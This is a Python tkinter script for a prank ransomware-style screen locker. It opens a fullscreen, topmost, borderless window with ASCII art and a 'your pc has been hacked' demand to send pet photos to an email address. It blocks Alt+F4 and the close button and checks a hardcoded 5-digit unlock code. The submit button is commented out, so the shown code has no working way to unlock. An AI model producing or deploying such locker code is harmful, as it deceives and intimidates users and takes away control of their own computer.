import tkinter as tk

ASCII = r"""
                                                                                . . .  .            
             .                                               .       . .      .                     
                                             .                                                      
                                          .             .          .                   .            
   .                                             .                  .                               
        .  .  .                 .   . .                               .                             
                            . .  .......... ............. ..........     .                          
   .         .            .      ... .......-+*%@@@@@%#*=:.... .. ..   . .                     .    
  .      .           .           ....-*%@@@@@@@@@@@@@@@@@@@@@%#=:...      . .                       
                      ...........:*@@@@@%#+:.           ..=*%@@@@@%=... .......                     
.  .      ..     .    ........-%@@@@#-.......           .......:+@@@@%+... .. .                     
                      .....:+@@@%+:..........           ........ ..=#@@@#:.....                     
                 ..    . .*@@@#...                      .      .    ..+@@@%:. ......          .     
                 ... ...+@@@+......               .                .....=@@@#:.......               
.   .            .... -@@@#.......  ..                    . .      .... ..=@@@+......               
                 ....*@@@:.....  .                     .           .........#@@#:....      .    .   
               . ...#@@#.....              .                    .    .   ....=@@@:..            .   
                 ..%@@+.......                      .                    .....:@@@-..           .   
    .      .......#@@=.. . ..     ... .... .  .          . ... .....     .... .-%@@......           
       .  . .....+@@+ ..         ...=%@@%=...           ...:#@@@+...         . .-@@@:.....    . .   
 ..   .    .....-@@%..  . .   .  ..%@@@@@@%.. .         ..+@@@@@@@: .  .       . =@@*.. ..          
         . .....%@@:...          .+@@@@@@@@*..          .:@@@@@@@@@.           ...#@@:....      .   
   . .     .. .=@@*...           .#@@@@@@@@%.           .*@@@@@@@@@-           ...=@@#....          
            ...*@@:. ..          .#@@@@@@@@%.            *@@@@@@@@@-     .     ....@@@:...     .   .
           ....%@%......       . .+@@@@@@@@*.           .:@@@@@@@@%.           ....*@@=...          
            ...@@#.....          ..#@@@@@@#..            .+@@@@@@%:.  . .      ....=@@+... .        
           . .:@@#...            ...-#@@#-..            ...:*@@%+...           . ..-@@*...  .       
           ...:@@#.....          ....... .....   ..    .........  .            ....-@@*...    .     
            ...@@#...                  . .... ......... ......           .     ....=@@+...          
           ....%@%:....                . .....................   .             ....#@@-...          
 .         ....*@@- ..             .   ....=#@@@@@@@@@@@%+:...           .     ....@@@:...          
           ....=@@*...           ......+%@@@@@%#**++*#%@@@@@@*-.....        .  . .=@@*....          
           . ...%@@-...     .    ...-@@@@@+.....   .......=%@@@@*...           ...%@@:....          
 . .       .....:@@%:.           .+@@@%-.....................:*@@@#.      .    ..*@@+.....   .      
     .           =@@*..... ... .-@@@#:.. .                .   ..+@@@+...........+@@%.       . .     
     .   .  .    .#@@*.....  ..+@@%:...                       ....#@@%:........=@@%..               
                 ..*@@*........#@*.....      . .              .....=@%-.......=@@%:..               
                 ...*@@@..........              .   .              ..........*@@#....               
           .  .  ....-@@@=........   .                             ........-%@@*....                
                 .....:#@@@-...           .       ..                   ...*@@%-...... .             
                      ..-@@@@:....... ..         .            .... .... *@@@+..            .        
      .  .           .....=%@@%=........         .         .  . .....-#@@@*....                     
         .            ......-%@@@@-.....                      ....-*@@@@+.......              .   . 
.               ..          ...=@@@@@#-.......................:*%@@@@*:...                      .   
  .   .                     ......=#@@@@@@#=--:.......::-=*%@@@@@%+:......                  .       
                             .........:*@@@@@@@@@@@@@@@@@@@@@*-...........                .         
                         ..           .... .:--===+===--:.....           .   .  . .  .              
                  .   .                .  ...   ....... ......                            .         
                               .     .   .................... .            .                    .   
                              .                                                   .         .       
               .        .                            .                                ..            
                                                     .        .                   .                 
                               .                                  .  .             .                
"""

root = tk.Tk()
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.overrideredirect(True)
root.configure(bg="black")

# ASCII art
ascii_label = tk.Label(
    root,
    text=ASCII,
    font=("Consolas", 6),
    fg="white",
    bg="black",
    justify="center"
)
ascii_label.place(relx=0.5, rely=0.45, anchor="center")

# Text underneath
text_label = tk.Label(
    root,
    text="your pc has been hacked! to unlock your pc send pet photos to lowtiergod555@gmail.com",
    font=("Arial", 24, "bold"),
    fg="white",
    bg="black"
)
text_label.place(relx=0.5, rely=0.75, anchor="center")
# Assuming 'root' is your main window and 'label' is your existing text widget

# 1. Create the white entry box
entry_box = tk.Entry(
    root,
    bg="white",           # Forces white background
    fg="black",           # Black text
    width=30,             # Adjust width as needed
    font=("Arial", 12),   # Match font to your style
    justify="center"      # Centers text in the box
)
entry_box.pack(pady=(0, 10)) # Adds space below the box

# 2. (Optional) Restrict to 5 digits if you still need that constraint
def validate_digit(char):
    return char.isdigit() or char == ""

reg = root.register(validate_digit)
entry_box.config(validate="key", validatecommand=(reg, '%S'))

# Enforce 5 character limit
def limit_length(*args):
    val = entry_box.get()
    if len(val) > 5:
        entry_box.delete(5, tk.END)

var = tk.StringVar()
var.trace_add("write", limit_length)
entry_box.config(textvariable=var)

# Result label for password feedback
result_label = tk.Label(
    root,
    text="",
    font=("Arial", 14),
    fg="white",
    bg="black"
)
result_label.place(relx=0.5, rely=0.85, anchor="center")

# 1. Set your secret password here
SECRET_PASSWORD = "63902"  # Change this to any 5-digit code you want

def check_password():
    user_input = entry_box.get()  # Get text from your white box
    
    if user_input == SECRET_PASSWORD:
        # Action for correct password
        result_label.config(text="Access Granted!", fg="green")
        # Add code here to open the next window or show content
    else:
        # Action for wrong password
        result_label.config(text="Wrong Code. Try again.", fg="red")
        entry_box.delete(0, tk.END) # Clears the box so they can type again

# Make sure your button calls this new function:
# tk.Button(root, text="Submit", command=check_password).pack()   

#start of blocker stuff frfr
def on_close_attempt():
    # Does nothing, effectively blocking the close
    pass

def on_alt_f4(event):
    on_close_attempt()
    return "break"  #: Stops Alt+F4 from closing the window

# Attach the blockers to the root window
root.bind('<Alt-F4>', on_alt_f4)
root.protocol("WM_DELETE_WINDOW", on_close_attempt)
#

